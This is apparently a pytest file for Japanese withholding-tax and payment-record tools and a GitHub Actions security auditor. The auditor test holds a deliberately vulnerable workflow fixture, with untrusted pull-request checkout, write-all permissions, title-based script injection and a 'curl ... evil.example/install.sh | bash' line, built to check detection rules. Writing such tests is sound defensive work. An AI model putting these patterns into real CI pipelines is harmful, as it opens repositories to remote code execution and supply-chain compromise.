"""Unit tests for Wave 7 Track 1 Actors #17-#18, Track 7 deliverable #5, and 8-gate Track 5 CLI."""

from __future__ import annotations

import csv
from pathlib import Path

from tracks.track1_apify.gh_actions_supplychain_actor.main import (
    audit_workflow_yaml_batch,
    audit_workflow_yaml_item,
)
from tracks.track1_apify.jp_gensen_shiharai_actor.main import (
    audit_gensen_shiharai_batch,
    calculate_gensen_item,
    gross_up_net_yen,
)
from tracks.track5_direct_sales.booth_pro_pack.batch_compliance_suite_cli import (
    run_offline_compliance_audit,
)
from tracks.track7_freelance_kit.deliverables.shiharai_chosho_csv_aggregator import (
    aggregate_shiharai_chosho_csv,
)


def test_actor17_gensen_withholding_boundaries_no6929_and_grossup() -> None:
    sep = calculate_gensen_item(
        110_000,
        tax_included_on_invoice=True,
        tax_excluded_specified=True,
        invoice_id="T7000012050002",
        period="post_2026_10",
    )
    assert sep["principal_yen"] == 100_000
    assert sep["withholding_tax_yen"] == 10_210
    assert sep["net_payable_yen"] == 99_790
    assert sep["no6929_over_withheld_yen"] == 0
    assert sep["unrecoverable_tax_yen"] == 0

    bundled = calculate_gensen_item(
        110_000,
        tax_included_on_invoice=True,
        tax_excluded_specified=False,
        has_valid_invoice=False,
        period="post_2026_10",
    )
    assert bundled["withholding_tax_yen"] == 11_231
    assert bundled["no6929_over_withheld_yen"] == 1_021
    assert bundled["unrecoverable_tax_yen"] == 5_000
    assert "NTA-NO6929-BUNDLED-VAT" in bundled["rule_flags"]
    assert "INVOICE-TRANSITIONAL-LOSS" in bundled["rule_flags"]

    over_1m = calculate_gensen_item(
        1_500_000,
        tax_included_on_invoice=False,
        tax_excluded_specified=True,
        invoice_id="T7000012050002",
    )
    assert over_1m["withholding_tax_yen"] == 204_200

    scr = calculate_gensen_item(
        30_000,
        tax_included_on_invoice=False,
        tax_excluded_specified=True,
        category="judicial_scrivener",
    )
    assert scr["withholding_tax_yen"] == 2_042

    inv = gross_up_net_yen(100_000, consumption_tax_rate=0.0, tax_excluded_specified=True)
    assert inv["principal_yen"] == 111_370
    assert inv["withholding_tax_yen"] == 11_370
    assert inv["net_payable_yen"] == 100_000
    assert inv["exact_match"] is True

    batch = audit_gensen_shiharai_batch([{"target_net_yen": 1_000_000, "consumption_tax_rate": 0.0}])
    assert batch[0]["principal_yen"] > 1_000_000
    assert batch[0]["net_payable_yen"] >= 1_000_000


def test_actor18_gh_actions_supplychain_security_auditor() -> None:
    vuln_yaml = """
name: PR Risky
on:
  pull_request_target:
permissions: write-all
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - uses: thirdparty/custom-scanner@v2
      - run: |
          echo "${{ github.event.pull_request.title }}"
          curl -sSL https://evil.example/install.sh | bash
"""
    safe_yaml = """
name: CI Hardened
on: [push]
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: thirdparty/pinned-tool@0123456789abcdef0123456789abcdef01234567
      - run: pytest -q
"""
    vuln_res = audit_workflow_yaml_item(vuln_yaml, "vuln.yml")
    for expected in (
        "GHA-PRT-UNTRUSTED-CHECKOUT",
        "GHA-EXCESSIVE-PERMISSIONS",
        "GHA-UNPINNED-ACTION",
        "GHA-SCRIPT-INJECTION",
        "GHA-CURL-PIPE-SH",
    ):
        assert expected in vuln_res["rule_ids"]
    assert vuln_res["risk_level"] == "high"

    batch = audit_workflow_yaml_batch([{"name": "safe.yml", "workflow_yaml": safe_yaml}])
    assert batch[0]["security_score"] == 100
    assert batch[0]["risk_level"] == "low"
    assert batch[0]["findings"] == []


def test_track7_shiharai_chosho_csv_aggregator(tmp_path: Path) -> None:
    in_csv = tmp_path / "payments.csv"
    out_csv = tmp_path / "summary.csv"
    rows = [
        {"payee_name": "高橋健一", "invoice_id": "", "amount_yen": "44000", "tax_excluded_specified": "true"},
        {"payee_name": "高橋健一", "invoice_id": "", "amount_yen": "22000", "tax_excluded_specified": "true"},
        {"payee_name": "中村花子", "invoice_id": "T7000012050002", "amount_yen": "33000", "tax_excluded_specified": "true"},
        {"payee_name": "株式会社品川", "invoice_id": "T7000012050002", "amount_yen": "550000", "payee_type": "corporation"},
    ]
    with in_csv.open("w", encoding="utf-8", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["payee_name", "invoice_id", "amount_yen", "tax_excluded_specified", "payee_type"])
        writer.writeheader()
        writer.writerows(rows)

    res = aggregate_shiharai_chosho_csv(in_csv, out_csv, period="post_2026_10")
    assert res["network_calls"] == 0
    assert res["total_payees"] == 3
    assert res["filing_required_count"] == 1
    assert res["total_unrecoverable_tax_yen"] == 3_000
    assert out_csv.read_bytes().startswith(b"\xef\xbb\xbf")


def test_track5_eight_gate_compliance_suite_audits_fee_yen() -> None:
    report = run_offline_compliance_audit(
        [
            {
                "text": "株式会社東京テスト 担当: 山田太郎",
                "invoice_id": "T8000012050002",
                "payee_name": "タカハシ ケンイチ",
                "fee_yen": "110000",
            }
        ]
    )
    assert report["network_calls"] == 0
    assert report["invalid_invoice_ids"] == 1
    assert report["gensen_audited_rows"] == 1
    g = report["rows"][0]["gensen_check"]
    assert g["withholding_tax_yen"] == 11_231
    assert g["unrecoverable_tax_yen"] == 5_000
